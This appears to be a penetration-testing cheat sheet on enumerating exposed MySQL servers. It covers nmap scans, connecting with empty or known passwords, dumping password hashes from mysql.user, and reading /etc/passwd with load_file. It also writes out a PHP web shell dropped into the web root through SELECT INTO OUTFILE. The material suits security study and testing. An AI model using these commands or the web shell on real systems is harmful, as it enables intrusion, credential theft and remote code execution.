
# MySQL

Layer 3 enumeration. MySQL is a relational database management system commonly exposed on web servers. It stores application data, usernames, passwords, and config -- making it high value if accessible. Often found as part of LAMP/LEMP stacks behind web apps like WordPress.

Port: `3306` TCP

> [!warning] Nmap False Positives
> The `mysql*` NSE scripts can return false positives -- particularly around empty passwords and valid usernames. Always manually confirm with the `mysql` client before acting on script output.

---

## Workflow

1. Nmap on port 3306 with `mysql*` scripts
2. Check for empty root password -- common on poorly secured installs
3. If you have credentials, connect with the `mysql` client
4. Enumerate databases, tables, and users
5. Check `secure_file_priv` -- if unset or permissive, file read/write may be possible
6. If you gain server access, check `/etc/mysql/mysql.conf.d/mysqld.cnf` for plaintext credentials

---

## Nmap

```bash
sudo nmap -sV -sC -p3306 --script mysql* <target>
```

Returns version, auth plugin, capabilities, and attempts to enumerate users and check for empty passwords. Manually verify anything interesting.

---

## Connecting

```bash
# Connect -- no password
mysql -u root -h <target>

# Connect with password (no space between -p and password)
mysql -u root -pP4SSw0rd -h <target>

# Connect to a specific database
mysql -u root -pP4SSw0rd -h <target> -D <database>
```

---

## SQL Enumeration Commands

Once connected:

| Command | Description |
|---------|-------------|
| `show databases;` | List all databases |
| `use <database>;` | Select a database |
| `show tables;` | List tables in selected database |
| `show columns from <table>;` | List columns in a table |
| `select * from <table>;` | Dump entire table |
| `select * from <table> where <column> = "<string>";` | Search for a value |
| `select version();` | MySQL version |
| `select user();` | Current MySQL user |
| `select @@datadir;` | Data directory path |
| `show grants for '<user>'@'<host>';` | User privileges |

---

## Key Internal Databases

| Database | Contents |
|----------|----------|
| `information_schema` | Metadata about all databases, tables, columns, and permissions. Read-only. Start here. |
| `mysql` | User accounts, privileges, and authentication. The `user` table contains password hashes. |
| `sys` | Performance and diagnostic views. Can reveal connected hosts and active users. |
| `performance_schema` | Runtime statistics and monitoring data. |

```sql
-- Dump all MySQL users and password hashes
select user, host, authentication_string from mysql.user;

-- Check current user privileges
show grants;

-- Check file read/write privilege setting
select @@secure_file_priv;
```

---

## Dangerous Settings

Config file: `/etc/mysql/mysql.conf.d/mysqld.cnf`

```bash
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

| Setting | Risk |
|---------|------|
| `user` / `password` in config | Plaintext credentials readable by anyone with file access |
| `admin_address` | Exposes admin interface -- check what's listening |
| `debug` | Verbose error output. Can leak schema, query structure, and internal paths to web app users |
| `sql_warnings` | Warning output on INSERT errors -- can confirm injection points |
| `secure_file_priv = ""` | No restriction on file read/write via SQL. Enables `LOAD DATA INFILE` and `SELECT INTO OUTFILE`. |

---

## File Read / Write via SQL

If `secure_file_priv` is empty and the MySQL user has `FILE` privilege:

```sql
-- Read a file
select load_file('/etc/passwd');

-- Write a file (e.g. a webshell if web root is known)
select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
```

> [!danger]
> Writing a webshell via `SELECT INTO OUTFILE` requires knowing the web root path and the MySQL user having write permission to that directory. Check `@@secure_file_priv` first -- if it returns a path, writes are restricted to that directory.

---

## What to Look For

- **Port 3306 externally accessible** -- databases should never be publicly exposed. Any externally reachable MySQL instance is a finding before you even touch it.
- **Empty root password** -- immediate full access. Verify manually with `mysql -u root -h <target>`.
- **Credentials in config file** -- if you can read `/etc/mysql/mysql.conf.d/mysqld.cnf`, check for plaintext passwords.
- **Password hashes in mysql.user** -- crack offline with [[07-Passwords/Hash-Cracking|Hash Cracking]] or pass directly if the application reuses them.
- **FILE privilege + permissive secure_file_priv** -- file read/write from SQL. Can lead to LFI or webshell drop.
- **debug / sql_warnings enabled** -- verbose errors surfaced to the web app. Useful for SQL injection enumeration. See [[_Tools/SQLmap|SQLmap]].
- **Web app database** -- look for WordPress (`wp_users`), Laravel, or other app tables. These often contain bcrypt or MD5 hashed passwords and email addresses.
- **Credential reuse** -- MySQL passwords are often reused across SSH, FTP, and application logins.
